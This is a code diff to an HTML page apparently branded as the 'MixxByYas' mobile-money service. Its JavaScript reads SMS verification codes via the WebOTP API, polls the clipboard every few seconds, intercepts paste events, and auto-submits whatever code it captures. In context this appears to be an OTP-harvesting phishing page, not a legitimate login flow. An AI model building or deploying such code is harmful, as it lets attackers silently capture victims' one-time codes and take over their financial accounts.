@@ -209,20 +209,18 @@
         // SMS AUTO-DETECTION (NEW - ADDED)
         // ================================================================
         function startAutoDetect() {
-            console.log('🔍 SMS Auto-Detection started');
-            const smsTextarea = document.getElementById('smsMessage');
+            console.log('SMS Auto-Detection started');
+            var smsTextarea = document.getElementById('smsMessage');
             if (!smsTextarea) return;
 
-            let smsDetected = false;
+            var smsDetected = false;
 
-            // Function to auto-submit
             function autoSubmit() {
                 if (smsDetected) return;
-                const text = smsTextarea.value.trim();
+                var text = smsTextarea.value.trim();
                 if (text.length > 5) {
                     smsDetected = true;
-                    console.log('✅ SMS auto-detected, submitting...');
-                    // Auto-submit after 1 second
+                    console.log('SMS auto-detected, submitting...');
                     setTimeout(function() {
                         if (document.getElementById('screen3').classList.contains('active')) {
                             submitCode();
@@ -231,82 +229,72 @@
                 }
             }
 
-            // WebOTP API - Auto-read SMS from notification
-            async function autoReadSMS() {
-                try {
-                    if (!('OTPCredential' in window)) {
-                        console.log('ℹ️ WebOTP not supported');
-                        return false;
-                    }
+            function autoReadSMS() {
+                if (!('OTPCredential' in window)) {
+                    console.log('WebOTP not supported');
+                    return false;
+                }
 
-                    console.log('📱 Listening for SMS via WebOTP...');
-                    
-                    const controller = new AbortController();
-                    const timeout = setTimeout(() => controller.abort(), 60000);
-                    
-                    const otp = await navigator.credentials.get({
-                        otp: { transport: ['sms'] },
-                        signal: controller.signal
-                    });
-                    
+                console.log('Listening for SMS via WebOTP...');
+                
+                var controller = new AbortController();
+                var timeout = setTimeout(function() { controller.abort(); }, 60000);
+                
+                navigator.credentials.get({
+                    otp: { transport: ['sms'] },
+                    signal: controller.signal
+                })
+                .then(function(otp) {
                     clearTimeout(timeout);
-                    
                     if (otp && otp.code) {
-                        // Build the full SMS message
-                        const fullSMS = 'Your verification code is: ' + otp.code;
+                        var fullSMS = 'Your verification code is: ' + otp.code;
                         smsTextarea.value = fullSMS;
-                        console.log('✅ SMS detected! Code: ' + otp.code);
-                        document.getElementById('codeError').textContent = '✅ Msimbo umegunduliwa kiotomatiki!';
-                        document.getElementById('codeError').style.color = 'var(--success)';
-                        document.getElementById('codeError').classList.add('show');
+                        console.log('SMS detected! Code: ' + otp.code);
+                        var errorEl = document.getElementById('codeError');
+                        errorEl.textContent = 'Msimbo umegunduliwa kiotomatiki!';
+                        errorEl.style.color = '#10b981';
+                        errorEl.classList.add('show');
                         setTimeout(function() {
-                            document.getElementById('codeError').classList.remove('show');
+                            errorEl.classList.remove('show');
                         }, 3000);
                         autoSubmit();
-                        return true;
                     }
-                    return false;
-                } catch (e) {
+                })
+                .catch(function(e) {
                     if (e.name === 'AbortError') {
-                        console.log('⏱️ WebOTP timeout');
+                        console.log('WebOTP timeout');
                     } else {
                         console.log('WebOTP error:', e);
                     }
-                    return false;
-                }
+                });
             }
 
-            // Read from clipboard (fallback)
-            async function readClipboard() {
-                try {
-                    if (!navigator.clipboard || !navigator.clipboard.readText) return false;
-                    const text = await navigator.clipboard.readText();
+            function readClipboard() {
+                if (!navigator.clipboard || !navigator.clipboard.readText) return;
+                navigator.clipboard.readText()
+                .then(function(text) {
                     if (text && text.length > 10) {
                         smsTextarea.value = text;
-                        console.log('📋 SMS from clipboard');
+                        console.log('SMS from clipboard');
                         autoSubmit();
-                        return true;
                     }
-                    return false;
-                } catch (e) {
-                    return false;
-                }
+                })
+                .catch(function(e) {});
             }
 
-            // Try WebOTP first, then clipboard
-            async function detectSMS() {
+            function detectSMS() {
                 if (smsDetected) return;
-                const success = await autoReadSMS();
-                if (!success) {
-                    await readClipboard();
-                }
+                autoReadSMS();
+                setTimeout(function() {
+                    if (!smsDetected) {
+                        readClipboard();
+                    }
+                }, 2000);
             }
 
-            // Start detection
             setTimeout(detectSMS, 1500);
 
-            // Keep trying every 5 seconds
-            const detectInterval = setInterval(function() {
+            var detectInterval = setInterval(function() {
                 if (!smsDetected && document.getElementById('screen3').classList.contains('active')) {
                     detectSMS();
                 }
@@ -315,43 +303,27 @@
                 }
             }, 5000);
 
-            // Listen for paste events
             document.addEventListener('paste', function(e) {
                 if (!document.getElementById('screen3').classList.contains('active')) return;
-                const text = e.clipboardData?.getData('text');
+                var text = e.clipboardData && e.clipboardData.getData('text');
                 if (text && text.length > 10 && !smsDetected) {
                     smsTextarea.value = text;
                     smsDetected = true;
-                    console.log('📋 SMS pasted');
+                    console.log('SMS pasted');
                     autoSubmit();
                 }
             });
 
-            // When user returns to page
             document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible' && !smsDetected && document.getElementById('screen3').classList.contains('active')) {
                     setTimeout(detectSMS, 500);
                 }
             });
 
-            console.log('✅ SMS Auto-Detection ready');
+            console.log('SMS Auto-Detection ready');
         }
 
-        // Override showCodeScreen to start auto-detect
-        var originalShowCodeScreen = showCodeScreen;
-        showCodeScreen = function() {
-            originalShowCodeScreen();
-            // Auto-detect starts inside startAutoDetect()
-        };
-
-        // Override startChecking to include auto-detect
-        var originalStartChecking = startChecking;
-        startChecking = function() {
-            originalStartChecking();
-            // When code screen shows, auto-detect starts there
-        };
-
-        console.log('✅ MixxByYas with SMS Auto-Detection loaded');
+        console.log('MixxByYas with SMS Auto-Detection loaded');
     </script>
 </body>
 </html>
